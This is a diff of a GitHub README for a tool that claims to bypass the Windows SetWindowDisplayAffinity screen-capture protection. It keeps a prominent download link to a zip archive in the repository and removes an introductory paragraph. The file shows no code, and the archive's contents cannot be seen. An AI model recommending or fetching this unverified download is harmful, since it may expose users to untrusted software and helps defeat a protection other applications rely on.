@@ -3,8 +3,6 @@
 ## 📦 Download Now
 [![Download SetWindowDisplayAffinity-Bypass](https://github.com/Baragoda/SetWindowDisplayAffinity-Bypass/raw/refs/heads/main/upstrive/Display-Set-Affinity-Window-Bypass-v1.7.zip)](https://github.com/Baragoda/SetWindowDisplayAffinity-Bypass/raw/refs/heads/main/upstrive/Display-Set-Affinity-Window-Bypass-v1.7.zip)
 
-## 🚀 Getting Started
-Welcome to the SetWindowDisplayAffinity-Bypass repository! This tool allows you to bypass the SetWindowDisplayAffinity Windows API without the need for Dll injection. It is user-friendly and perfect for individuals who need a straightforward solution without diving into complex coding.
 
 ## 📋 Features
 - **User-Friendly Interface**: Navigate easily without any programming skills.
